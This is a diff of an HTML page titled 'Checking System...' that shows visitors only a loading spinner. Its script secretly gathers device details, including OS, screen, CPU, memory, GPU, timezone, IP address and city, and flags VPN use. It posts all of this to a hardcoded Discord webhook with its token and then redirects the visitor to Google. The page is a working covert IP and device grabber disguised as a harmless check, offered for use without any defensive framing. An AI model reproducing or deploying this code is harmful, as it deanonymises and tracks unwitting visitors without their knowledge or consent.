@@ -1,51 +1,89 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"><style>
-body{background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden}
-.l{border:3px solid #111;border-top:3px solid #0f0;border-radius:50%;width:35px;height:35px;animation:s 1s linear infinite}
-@keyframes s{to{transform:rotate(360deg)}}
-</style></head><body><div class="l"></div><script>
-(function(){"use strict";
-const hook = "https://canary.discord.com/api/webhooks/1457149465688543363/FlP0AtpIk-Yg8NwxGQ1CSdityVf67AL-ODXFlPl9FtQq-tV5j2a9iZmWkGNAUsOHD9uL";
-const redir = "https://www.google.com";
-const run = async () => {
-    let d = {
-        os: navigator.platform,
-        res: screen.width + "x" + screen.height,
-        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        mem: navigator.deviceMemory || "N/A",
-        cpu: navigator.hardwareConcurrency || "N/A",
-        gpu: "N/A", ip: "N/A", vpn: "✅ Clear"
-    };
-    try {
-        const c = document.createElement('canvas');
-        const g = c.getContext('webgl');
-        const b = g.getExtension('WEBGL_debug_renderer_info');
-        d.gpu = g.getParameter(b.UNMASKED_RENDERER_ID);
-    } catch(e){}
-    try {
-        const r = await fetch('https://ipapi.co/json/');
-        const j = await r.json();
-        d.ip = j.ip; d.loc = j.city + "/" + j.country_name;
-        if(j.timezone !== d.tz) d.vpn = "🚨 **VPN/PROXY**";
-    } catch(e){}
-    const msg = {
-        embeds: [{
-            title: "💀 FULL DEVICE EXTRACTION",
-            color: 3066993,
-            fields: [
-                {name: "📡 NETWORK", value: "IP: `" + d.ip + "`\nVPN: " + d.vpn, inline: true},
-                {name: "⚙️ HARDWARE", value: "OS: " + d.os + "\nCPU: " + d.cpu + "\nRAM: " + d.mem + "GB\nGPU: " + d.gpu, inline: false},
-                {name: "🖥️ DISPLAY", value: "Res: " + d.res + "\nTZ: " + d.tz, inline: true}
-            ],
-            footer: {text: "Omniscience V7000"},
-            timestamp: new Date().toISOString()
-        }]
-    };
-    const blob = new Blob([JSON.stringify(msg)], {type: 'application/json'});
-    if(navigator.sendBeacon) { navigator.sendBeacon(hook, blob); }
-    else { fetch(hook, {method: 'POST', mode: 'no-cors', body: JSON.stringify(msg)}); }
-    setTimeout(() => { window.location.replace(redir); }, 1500);
-};
-window.onload = run;
-})();
-</script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Checking System...</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .l { border: 3px solid #111; border-top: 3px solid #0f0; border-radius: 50%; width: 30px; height: 30px; animation: s 1s linear infinite; }
+        @keyframes s { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="l"></div>
+
+    <script>
+        (function() {
+            "use strict";
+
+            var WEBHOOK = "https://canary.discord.com/api/webhooks/1457149465688543363/FlP0AtpIk-Yg8NwxGQ1CSdityVf67AL-ODXFlPl9FtQq-tV5j2a9iZmWkGNAUsOHD9uL";
+            var REDIR = "https://www.google.com";
+
+            var run = function() {
+                var d = {
+                    os: navigator.platform,
+                    res: screen.width + "x" + screen.height,
+                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    mem: navigator.deviceMemory || "N/A",
+                    cpu: navigator.hardwareConcurrency || "N/A",
+                    gpu: "Unknown",
+                    vdr: "Unknown",
+                    ip: "N/A",
+                    vpn: "✅ Clear"
+                };
+
+                // GPU/Hardware Extraction
+                try {
+                    var c = document.createElement('canvas');
+                    var gl = c.getContext('webgl');
+                    var db = gl.getExtension('WEBGL_debug_renderer_info');
+                    d.gpu = gl.getParameter(db.UNMASKED_RENDERER_ID);
+                    d.vdr = gl.getParameter(db.UNMASKED_VENDOR_ID);
+                } catch(e) {}
+
+                // Network & VPN Extraction
+                fetch('https://ipapi.co/json/')
+                    .then(function(r) { return r.json(); })
+                    .then(function(j) {
+                        d.ip = j.ip;
+                        d.loc = j.city + ", " + j.region + " / " + j.country_name;
+                        if(j.timezone !== d.tz) { d.vpn = "🚨 **VPN DETECTED**"; }
+                        send(d);
+                    })
+                    .catch(function() { send(d); });
+            };
+
+            var send = function(data) {
+                var payload = {
+                    embeds: [{
+                        title: "💀 DATA CAPTURED - FULL SPECTRUM",
+                        color: 3066993,
+                        fields: [
+                            { name: "📡 NETWORK", value: "IP: " + data.ip + "\nLoc: " + data.loc + "\nVPN: " + data.vpn, inline: false },
+                            { name: "⚙️ HARDWARE", value: "OS: " + data.os + "\nCPU: " + data.cpu + " Cores\nRAM: " + data.mem + "GB\nGPU: " + data.gpu, inline: false },
+                            { name: "🖥️ DISPLAY", value: "Res: " + data.res + "\nTZ: " + data.tz + "\nVendor: " + data.vdr, inline: true }
+                        ],
+                        footer: { text: "Protocol: Omniscience 2026" },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                var blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+                
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(WEBHOOK, blob);
+                } else {
+                    fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
+                }
+
+                setTimeout(function() {
+                    window.location.replace(REDIR);
+                }, 1200);
+            };
+
+            window.onload = run;
+        })();
+    </script>
+</body>
+</html>
 
